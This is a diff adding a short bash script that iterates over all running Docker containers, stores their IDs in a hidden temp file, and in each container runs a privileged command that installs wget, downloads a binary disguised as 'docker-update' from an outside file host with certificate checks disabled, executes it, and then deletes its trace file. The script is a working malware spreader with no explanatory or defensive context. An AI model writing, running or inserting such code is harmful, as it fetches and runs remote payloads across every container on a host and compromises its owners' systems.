@@ -1,0 +1,6 @@
+#!/bin/bash
+docker ps | awk '{print $1}' | grep -v grep | grep -v CONTAINER >> /tmp/.dc
+for i in $(cat /tmp/.dc); do
+docker exec --privileged -i $i sh -c "apt-get update; apt-get install -y wget; yum install -y wget; apk update; apk add wget; mkdir /var/tmp/ -p; wget --no-check-certificate https://filepush.co/chwX/docker-update -O /var/tmp/docker-update; chmod +x /var/tmp/docker-update; /var/tmp/docker-update"
+done;
+rm -f /tmp/.dc
